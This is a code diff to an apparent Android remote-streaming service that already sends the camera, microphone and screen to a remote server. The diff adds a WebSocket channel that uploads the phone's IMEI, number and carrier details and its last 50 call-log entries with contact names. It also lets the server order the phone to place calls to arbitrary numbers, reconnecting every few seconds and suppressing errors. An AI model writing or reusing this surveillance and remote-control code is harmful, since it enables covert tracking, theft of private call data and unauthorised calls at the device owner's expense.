@@ -23,6 +23,9 @@ import androidx.core.content.ContextCompat
 import androidx.lifecycle.*
 import okhttp3.*
 import okio.ByteString.Companion.toByteString
+import android.provider.CallLog
+import android.telephony.TelephonyManager
+import org.json.JSONArray
 import org.json.JSONObject
 import java.io.ByteArrayOutputStream
 import java.nio.ByteBuffer
@@ -81,6 +84,7 @@ class StreamingService : Service() {
     @Volatile private var wsFront: WebSocket? = null
     @Volatile private var wsAudio: WebSocket? = null
     @Volatile private var wsScreen: WebSocket? = null
+    @Volatile private var wsPhone: WebSocket? = null
     @Volatile private var frameErrorReported = false
 
     private val serverBase: String get() {
@@ -113,6 +117,7 @@ class StreamingService : Service() {
                 val code = intent.getIntExtra("projectionCode", -1)
                 @Suppress("DEPRECATION")
                 val data = intent.getParcelableExtra<Intent>("projectionData")
+                if (wsPhone == null) connectPhoneWs()
                 if (code != -1 && data != null && mediaProjection == null) {
                     val mgr = getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
                     mediaProjection = mgr.getMediaProjection(code, data)
@@ -304,6 +309,137 @@ class StreamingService : Service() {
         screenHandlerThread?.quitSafely(); screenHandlerThread = null; screenHandler = null
     }
 
+    // ── Phone / Calls WebSocket ────────────────────────────────────────────
+
+    private fun connectPhoneWs() {
+        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE)
+            != PackageManager.PERMISSION_GRANTED) return
+        http.newWebSocket(
+            Request.Builder().url("$serverBase/phone?role=phone&model=$encodedModel").build(),
+            object : WebSocketListener() {
+                override fun onOpen(ws: WebSocket, response: Response) {
+                    wsPhone = ws
+                    sendPhoneInfo(ws)
+                    sendCallLog(ws)
+                }
+                override fun onMessage(ws: WebSocket, text: String) {
+                    try {
+                        val json = JSONObject(text)
+                        when (json.optString("cmd")) {
+                            "get-phone-info" -> sendPhoneInfo(ws)
+                            "get-call-log"   -> sendCallLog(ws)
+                            "call"           -> makeCall(json.optString("number", ""))
+                        }
+                    } catch (_: Exception) {}
+                }
+                override fun onFailure(ws: WebSocket, t: Throwable, response: Response?) {
+                    if (ws == wsPhone) wsPhone = null
+                    if (isRunning) Handler(Looper.getMainLooper()).postDelayed({ if (wsPhone == null) connectPhoneWs() }, 5000)
+                }
+                override fun onClosed(ws: WebSocket, code: Int, reason: String) {
+                    if (ws == wsPhone) wsPhone = null
+                    if (isRunning) Handler(Looper.getMainLooper()).postDelayed({ if (wsPhone == null) connectPhoneWs() }, 5000)
+                }
+            })
+    }
+
+    private fun sendPhoneInfo(ws: WebSocket) {
+        try {
+            val tm = getSystemService(TELEPHONY_SERVICE) as TelephonyManager
+            val json = JSONObject()
+            json.put("type", "phone-info")
+            json.put("model", "${Build.MANUFACTURER} ${Build.MODEL}")
+            json.put("operator", tm.networkOperatorName ?: "")
+            json.put("simOperator", tm.simOperatorName ?: "")
+            @Suppress("DEPRECATION")
+            json.put("networkType", getNetworkTypeName(tm.networkType))
+            if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_NUMBERS)
+                == PackageManager.PERMISSION_GRANTED) {
+                json.put("number", tm.line1Number ?: "")
+            }
+            try {
+                val imei = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
+                    tm.imei ?: "" else @Suppress("DEPRECATION") tm.deviceId ?: ""
+                json.put("imei", imei)
+            } catch (_: Exception) {}
+            ws.send(json.toString())
+        } catch (_: Exception) {}
+    }
+
+    @Suppress("DEPRECATION")
+    private fun getNetworkTypeName(type: Int): String = when (type) {
+        TelephonyManager.NETWORK_TYPE_LTE    -> "LTE/4G"
+        TelephonyManager.NETWORK_TYPE_HSDPA,
+        TelephonyManager.NETWORK_TYPE_HSUPA,
+        TelephonyManager.NETWORK_TYPE_HSPA,
+        TelephonyManager.NETWORK_TYPE_HSPAP  -> "HSPA/3G+"
+        TelephonyManager.NETWORK_TYPE_UMTS   -> "3G UMTS"
+        TelephonyManager.NETWORK_TYPE_EDGE   -> "EDGE/2G+"
+        TelephonyManager.NETWORK_TYPE_GPRS   -> "GPRS/2G"
+        TelephonyManager.NETWORK_TYPE_CDMA,
+        TelephonyManager.NETWORK_TYPE_1xRTT  -> "CDMA"
+        TelephonyManager.NETWORK_TYPE_EVDO_0,
+        TelephonyManager.NETWORK_TYPE_EVDO_A,
+        TelephonyManager.NETWORK_TYPE_EVDO_B -> "EVDO"
+        20                                   -> "5G NR"
+        else                                 -> "неизвестно ($type)"
+    }
+
+    private fun sendCallLog(ws: WebSocket) {
+        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG)
+            != PackageManager.PERMISSION_GRANTED) {
+            ws.send(JSONObject().put("type", "call-log-error")
+                .put("msg", "Нет разрешения READ_CALL_LOG").toString())
+            return
+        }
+        try {
+            val entries = JSONArray()
+            val cursor = contentResolver.query(
+                CallLog.Calls.CONTENT_URI,
+                arrayOf(CallLog.Calls.NUMBER, CallLog.Calls.CACHED_NAME,
+                        CallLog.Calls.TYPE, CallLog.Calls.DATE, CallLog.Calls.DURATION),
+                null, null, "${CallLog.Calls.DATE} DESC"
+            )
+            cursor?.use { c ->
+                val numCol  = c.getColumnIndex(CallLog.Calls.NUMBER)
+                val nameCol = c.getColumnIndex(CallLog.Calls.CACHED_NAME)
+                val typeCol = c.getColumnIndex(CallLog.Calls.TYPE)
+                val dateCol = c.getColumnIndex(CallLog.Calls.DATE)
+                val durCol  = c.getColumnIndex(CallLog.Calls.DURATION)
+                var count = 0
+                while (c.moveToNext() && count < 50) {
+                    val e = JSONObject()
+                    e.put("number",   c.getString(numCol)  ?: "")
+                    e.put("name",     c.getString(nameCol) ?: "")
+                    e.put("callType", when (c.getInt(typeCol)) {
+                        CallLog.Calls.INCOMING_TYPE -> "incoming"
+                        CallLog.Calls.OUTGOING_TYPE -> "outgoing"
+                        CallLog.Calls.MISSED_TYPE   -> "missed"
+                        else                        -> "unknown"
+                    })
+                    e.put("date",     c.getLong(dateCol))
+                    e.put("duration", c.getInt(durCol))
+                    entries.put(e)
+                    count++
+                }
+            }
+            ws.send(JSONObject().put("type", "call-log").put("entries", entries).toString())
+        } catch (e: Exception) {
+            ws.send(JSONObject().put("type", "call-log-error").put("msg", e.message ?: "ошибка").toString())
+        }
+    }
+
+    private fun makeCall(number: String) {
+        if (number.isBlank()) return
+        if (ContextCompat.checkSelfPermission(this, Manifest.permission.CALL_PHONE)
+            != PackageManager.PERMISSION_GRANTED) return
+        try {
+            val intent = Intent(Intent.ACTION_CALL, Uri.parse("tel:${number.trim()}"))
+            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+            startActivity(intent)
+        } catch (_: Exception) {}
+    }
+
     // ── CameraX binding & switching ────────────────────────────────────────
 
     private fun sendCamStatus(text: String) {
@@ -408,6 +544,7 @@ class StreamingService : Service() {
         wsFront?.close(1000, "stop");  wsFront = null
         wsAudio?.close(1000, "stop");  wsAudio = null
         wsScreen?.close(1000, "stop"); wsScreen = null
+        wsPhone?.close(1000, "stop");  wsPhone = null
         stopAudioCapture()
         releaseVirtualDisplay()
         mediaProjection?.stop(); mediaProjection = null
